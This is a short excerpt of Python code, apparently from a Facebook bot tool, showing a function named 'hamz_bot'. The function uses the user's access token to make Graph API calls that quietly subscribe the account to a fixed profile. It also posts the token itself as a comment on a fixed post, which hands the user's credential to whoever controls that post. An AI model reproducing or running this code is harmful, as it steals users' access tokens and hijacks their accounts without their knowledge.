...
def hamz_bot():
    ...
    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + cookie)
    requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + cookie)
    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +cookie+ '&access_token=' + cookie)
    requests.post('https://graph.facebook.com/3115522672004866/comments/?message=' +kom+ '&access_token=' + cookie)
    menu()
